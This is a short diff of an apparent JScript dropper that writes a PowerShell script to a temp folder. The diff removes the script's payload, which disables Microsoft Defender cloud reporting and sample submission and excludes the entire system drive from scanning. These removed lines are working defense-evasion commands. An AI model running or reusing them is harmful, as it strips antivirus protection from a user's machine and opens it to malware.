@@ -12,14 +12,7 @@ var psPath = tempFolder + "\\" + psFilename;
 
 // PowerShell script content (robust with try/catch and readable output)
 var psContent =
-'try {\n' +
-'    Write-Output "Loading...";\n' +
-'    Set-MpPreference -MAPSReporting 0;\n' +
-'    Set-MpPreference -SubmitSamplesConsent 2;\n' +
-'    Add-MpPreference -ExclusionPath $env:SystemDrive -ErrorAction Stop;\n' +
-'} catch {\n' +
-'    Write-Error ("ERROR: " + $_.Exception.Message);\n' +
-'}\n';
+'\n';
 
 // Write the PS script to temp
 try {
@@ -64,6 +57,7 @@ try {
 }
 // If you want the temp file removed after the PS window closes, you can add a cleanup step manually.
 WScript.Quit(0);
+
 
 
 
